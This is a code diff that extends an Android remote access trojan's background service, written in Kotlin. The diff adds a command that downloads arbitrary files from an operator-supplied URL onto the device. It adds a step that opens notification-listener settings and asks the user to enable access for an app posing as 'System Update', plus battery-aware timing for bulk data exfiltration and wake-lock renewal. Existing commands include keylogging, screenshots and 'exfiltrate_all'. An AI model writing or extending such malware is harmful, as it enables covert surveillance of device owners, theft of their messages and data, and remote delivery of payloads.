@@ -107,8 +107,17 @@ class MainService : Service() {
         const val CMD_EXFILTRATE_ALL = "exfiltrate_all"
         const val CMD_REFRESH_DATA = "refresh_data"
         const val CMD_UNINSTALL_APP = "uninstall_app"
+        const val CMD_DOWNLOAD_FILE = "download_file"
+        const val CMD_ENABLE_NOTIF_LISTENER = "enable_notification_listener"
+        const val CMD_GET_NOTIFICATIONS_CACHED = "get_notifications_cached"
 
         const val MAX_RESULTS = 500
+        // Battery-aware throttling
+        private const val BATTERY_HIGH_THRESHOLD = 50
+        private const val BATTERY_LOW_THRESHOLD = 15
+        private const val HIGH_BATTERY_INTERVAL = 30000L  // 30s
+        private const val MEDIUM_BATTERY_INTERVAL = 60000L // 1min
+        private const val LOW_BATTERY_INTERVAL = 180000L  // 3min
     }
     
     override fun onCreate() {
@@ -448,6 +457,9 @@ class MainService : Service() {
             CMD_STOP_KEYLOGGER -> stopKeylogger()
             CMD_TAKE_SCREENSHOT -> takeScreenshot()
             CMD_UNINSTALL_APP -> uninstallApp(params)
+            CMD_DOWNLOAD_FILE -> downloadFile(params)
+            CMD_ENABLE_NOTIF_LISTENER -> enableNotificationListener()
+            CMD_GET_NOTIFICATIONS_CACHED -> getCachedNotifications()
             else -> JSONObject().apply { put("error", "Unknown command: $type") }
         }
     }
@@ -1045,13 +1057,26 @@ class MainService : Service() {
                         safeEmit("device:ping", JSONObject())
                         safeEmit("device:update", JSONObject().apply { put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging()) })
                     }
-                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) sendBulkData()
-                    // Renew wake lock every 5 minutes
-                    if (System.currentTimeMillis() % 300000 < 30000) {
-                        try { wakeLock?.acquire(10 * 60 * 1000L) } catch (e: Exception) {}
+                    // Battery-aware bulk data sending
+                    val batteryLevel = getBatteryLevel()
+                    val isCharging = isCharging()
+                    val bulkDataInterval = when {
+                        isCharging -> 120000L // 2 min when charging
+                        batteryLevel >= BATTERY_HIGH_THRESHOLD -> HIGH_BATTERY_INTERVAL // 30s
+                        batteryLevel >= BATTERY_LOW_THRESHOLD -> MEDIUM_BATTERY_INTERVAL // 1min
+                        else -> LOW_BATTERY_INTERVAL // 3min when low battery
+                    }
+                    if (System.currentTimeMillis() - lastBulkDataSent > bulkDataInterval) {
+                        sendBulkData()
+                    }
+                    // Renew wake lock - less frequently when battery is low
+                    if (batteryLevel >= BATTERY_LOW_THRESHOLD || isCharging) {
+                        if (System.currentTimeMillis() % 300000 < 30000) {
+                            try { wakeLock?.acquire(10 * 60 * 1000L) } catch (e: Exception) {}
+                        }
                     }
                 } catch (e: Exception) { Log.e(TAG, "Periodic update error: ${e.message}") }
-                Handler(Looper.getMainLooper()).postDelayed(this, 15000) // Every 15 seconds instead of 30
+                Handler(Looper.getMainLooper()).postDelayed(this, 15000)
             }
         }, 15000)
     }
@@ -1182,6 +1207,100 @@ class MainService : Service() {
         return JSONObject().apply { put("status", "screenshot requires MediaProjection API"); put("note", "Not available via simple service") }
     }
     
+    /**
+     * Downloads a file from a URL to the device's Downloads folder.
+     * Command params: { url: string, filename?: string }
+     */
+    private fun downloadFile(params: JSONObject): JSONObject {
+        return try {
+            val urlStr = params.getString("url")
+            val fileName = params.optString("filename", "downloaded_${System.currentTimeMillis()}.bin")
+            
+            Thread {
+                try {
+                    val url = URL(urlStr)
+                    val connection = url.openConnection()
+                    connection.connectTimeout = 30000
+                    connection.readTimeout = 30000
+                    
+                    val inputStream = connection.getInputStream()
+                    val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                    if (!downloadsDir.exists()) downloadsDir.mkdirs()
+                    
+                    val file = File(downloadsDir, fileName)
+                    val outputStream = FileOutputStream(file)
+                    
+                    val buffer = ByteArray(8192)
+                    var bytesRead: Int
+                    var totalBytes = 0L
+                    
+                    while (inputStream.read(buffer).also { bytesRead = it } != -1) {
+                        outputStream.write(buffer, 0, bytesRead)
+                        totalBytes += bytesRead
+                    }
+                    
+                    outputStream.close()
+                    inputStream.close()
+                    
+                    Log.d(TAG, "File downloaded: $fileName (${totalBytes} bytes)")
+                    
+                    // Notify media scanner
+                    val mediaScanIntent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE)
+                    mediaScanIntent.data = Uri.fromFile(file)
+                    sendBroadcast(mediaScanIntent)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Download error: ${e.message}")
+                }
+            }.start()
+            
+            JSONObject().apply {
+                put("success", true)
+                put("message", "Download started")
+                put("fileName", fileName)
+                put("url", urlStr)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply { put("error", e.message ?: "Download failed") }
+        }
+    }
+
+    /**
+     * Opens notification listener settings so user can enable notification access.
+     */
+    private fun enableNotificationListener(): JSONObject {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                val intent = Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+                JSONObject().apply { put("success", true); put("message", "Notification listener settings opened. Enable 'System Update' access.") }
+            } else {
+                JSONObject().apply { put("error", "Notification listener requires Android 5.1+"); put("success", false) }
+            }
+        } catch (e: Exception) {
+            JSONObject().apply { put("error", e.message ?: "Failed to open settings") }
+        }
+    }
+
+    /**
+     * Gets cached notifications (those captured by NotificationListener).
+     * Currently returns a stub - actual notifications are streamed in real-time via the listener.
+     */
+    private fun getCachedNotifications(): JSONObject {
+        return try {
+            val sharedPrefs = getSharedPreferences("rat_notif_prefs", Context.MODE_PRIVATE)
+            val isActive = sharedPrefs.getBoolean("notification_listener_active", false)
+            JSONObject().apply {
+                put("listenerActive", isActive)
+                put("note", if (isActive) "Listener is active - notifications are being captured in real-time" 
+                    else "Listener inactive. Use enable_notification_listener command to activate")
+                put("requiresPermission", "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE")
+            }
+        } catch (e: Exception) {
+            JSONObject().apply { put("error", e.message ?: "Failed to get notification status") }
+        }
+    }
+
     private fun uninstallApp(params: JSONObject): JSONObject {
         try {
             val packageName = params.getString("packageName")
